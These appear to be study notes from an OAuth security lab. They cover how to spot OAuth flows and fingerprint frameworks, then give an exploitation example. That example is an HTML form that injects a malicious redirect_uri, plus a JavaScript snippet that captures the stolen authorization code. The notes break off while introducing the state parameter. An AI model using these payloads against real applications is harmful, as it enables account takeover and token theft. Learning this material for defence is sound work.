#OAuth #WEB #WebAuthentication

# Identifying OAuth Usage in an Application

*The first indication that an application uses OAuth is often found in the login process.* 
- Look for options allowing users to log in using external service providers like Google, Facebook, and GitHub. 

## Detecting OAuth Implementation

-  OAuth implementations will generally **redirect the browser to an authorization server's URL** . 
	- This URL often contains specific query parameters, such as `response_type`, `client_id`, `redirect_uri`, `scope`, and `state`. These parameters are indicative of an OAuth flow in progress. 
	- ==EX:== ```
```Python
https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123
```

## Identifying the OAuth Framework

Once you have confirmed that OAuth is being used, *identify the specific framework or library the application employs*. 
This can provide insights into potential vulnerabilities and the appropriate security assessments :

- **HTTP Headers and Responses**: Inspect HTTP headers and response bodies for unique identifiers or comments referencing specific OAuth libraries or frameworks.

- **Source Code Analysis**: If you can access the application's source code, search for specific keywords and import statements that can reveal the framework in use. For instance, libraries like `django-oauth-toolkit`, `oauthlib`, `spring-security-oauth`, or `passport` in `Node.js`, each have unique characteristics and naming conventions.

- **Authorization and Token Endpoints**: Analyze the endpoints used to obtain authorization codes and access tokens. Different OAuth implementations might have unique endpoint patterns or structures. For example, the `Django OAuth Toolkit` typically follows the pattern `/oauth/authorize/` and `/oauth/token/`, while other frameworks might use different paths.

- **Error Messages**: Custom error messages and debug output can inadvertently reveal the underlying technology stack. Detailed error messages might include references to specific OAuth libraries or frameworks.

---

# Exploitation

## Stealing OAuth tokens

- Issued by the authorization server and *redirected to the client application* based on the `redirect_uri` parameter. 
- This redirection is crucial in the OAuth flow, ensuring that tokens are securely transmitted to the intended recipient. 

if the `redirect_uri` is not well protected, attackers can exploit it to **hijack tokens**.

TODO : Gain control over any domain or URI listed in the `redirect_uri`, then manipulate the flow to intercept tokens

==EX:==

The attacker has compromised the authorized domain `dev.bistro.thm:8002` and can host any HTML page on the server 
(craft a simple HTML page `redirect_uri.html`)
- We will send a link to the target through: *Social engineering tactics or a CSRF attack*

``` HTML
<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get"> 
	<input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">             
	<input type="submit" value="Hijack OAuth">         
</form>
```

This form sends a hidden `redirect_uri` parameter with the value `http://dev.bistro.thm:8002/malicious_redirect.html` and submits a request to [http://coffee.thm:8000/oauthdemo/oauth_login/.](http://coffee.thm:8000/oauthdemo/oauth_login/.)  The `malicious_redirect.html` page then intercepts the authorization code from the URL using the following code:

```javascript
<script>
    // Extract the authorization code from the URL
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    document.getElementById('auth_code').innerText = code;
    console.log("Intercepted Authorization Code:", code);
    // code to save the acquired code in database/file etc
</script>   
```

## Weak or Missing State Parameter
The **state** parameter in the OAuth 2.0 framework protects against CSRF attacks, which occur when an attacker tricks a user into executing unwanted actions on a web application where they are currently authenticated*